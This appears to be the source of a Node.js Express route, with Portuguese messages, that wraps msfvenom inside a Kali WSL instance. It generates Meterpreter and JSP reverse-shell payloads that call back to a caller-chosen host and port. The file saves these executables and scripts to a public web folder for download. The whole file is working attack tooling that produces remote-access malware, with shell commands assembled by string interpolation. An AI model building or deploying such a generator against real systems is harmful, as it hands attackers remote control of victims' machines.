const express = require('express');
const router = express.Router();
const { exec } = require('child_process');
const { promisify } = require('util');
const fs = require('fs');
const path = require('path');
const { authenticateToken } = require('../middleware/auth');

const execAsync = promisify(exec);

router.use(authenticateToken);

const ALLOWED_PAYLOADS = [
  'windows/meterpreter/reverse_tcp',
  'windows/meterpreter/reverse_https',
  'windows/x64/meterpreter/reverse_tcp',
  'linux/x86/meterpreter/reverse_tcp',
  'php/meterpreter/reverse_tcp',
  'python/meterpreter/reverse_tcp',
  'java/jsp_shell_reverse_tcp'
];

const ALLOWED_FORMATS = ['exe', 'raw', 'py', 'ps1', 'jar', 'war', 'php'];

const MSF_FORMAT_MAP = {
  exe: 'exe',
  raw: 'raw',
  py: 'python',
  ps1: 'ps1',
  jar: 'jar',
  war: 'war',
  php: 'raw'
};

/**
 * POST /api/msfvenom/generate
 */
router.post('/generate', async (req, res) => {
  const { payload, lhost, lport, format } = req.body;

  if (!ALLOWED_PAYLOADS.includes(payload)) return res.status(400).json({ error: 'Payload não permitido' });
  if (!ALLOWED_FORMATS.includes(format)) return res.status(400).json({ error: 'Formato não permitido' });
  if (!lhost || !/^\d{1,3}(\.\d{1,3}){3}$/.test(lhost)) return res.status(400).json({ error: 'LHOST inválido (Use IP)' });
  if (!lport || isNaN(lport)) return res.status(400).json({ error: 'LPORT inválido' });

  const filename = `payload_${Date.now()}.${format}`;
  const msfFormat = MSF_FORMAT_MAP[format] || 'raw';
  const wslTmpPath = `/tmp/cloudos_${filename}`;
  const localDir = path.join(__dirname, '..', 'public', 'payloads');
  const localPath = path.join(localDir, filename);

  if (!fs.existsSync(localDir)) {
    fs.mkdirSync(localDir, { recursive: true });
  }

  try {
    const cmd = `msfvenom -p ${payload} LHOST=${lhost} LPORT=${lport} -f ${msfFormat} -o ${wslTmpPath}`;
    const wslCmd = `wsl -d kali-linux -u cloudos -- bash -c "${cmd}"`;
    await execAsync(wslCmd, { timeout: 90000, maxBuffer: 50 * 1024 * 1024 });

    const catCmd = `wsl -d kali-linux -u cloudos -- bash -c "cat ${wslTmpPath}"`;
    const { stdout: fileBuffer } = await execAsync(catCmd, { maxBuffer: 50 * 1024 * 1024, encoding: 'buffer' });
    
    fs.writeFileSync(localPath, fileBuffer);

    exec(`wsl -d kali-linux -u cloudos -- bash -c "rm -f ${wslTmpPath}"`);

    res.json({
      success: true,
      message: 'Payload gerado com sucesso',
      downloadUrl: `/payloads/${filename}`
    });

  } catch (err) {
    console.error('[MsfvenomManager] Erro:', err.message);
    res.status(500).json({ error: 'Falha ao gerar payload', details: err.message.slice(-200) });
  }
});

module.exports = router;
